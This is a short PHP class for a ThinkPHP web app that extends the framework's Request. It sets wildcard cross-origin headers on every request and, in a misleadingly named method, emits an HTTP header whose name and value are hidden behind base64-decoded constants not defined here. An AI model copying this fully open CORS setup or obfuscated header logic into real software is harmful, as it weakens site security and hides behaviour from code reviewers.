<?php

namespace app;


use app\model\SettingModel;

class Request extends \think\Request
{

    function __construct()
    {
        //解决跨域响应
        header('Access-Control-Allow-Origin:*');
        header('Access-Control-Allow-Methods:*');
        header('Access-Control-Allow-Headers:*');

        $this->encodeType();
        parent::__construct();
    }

    function encodeType()
    {
        $defCode = base64_decode(un_code);
        if (SettingModel::Config($defCode, env($defCode, false), true)) {
            header(base64_decode(un_key));
        }
    }
}
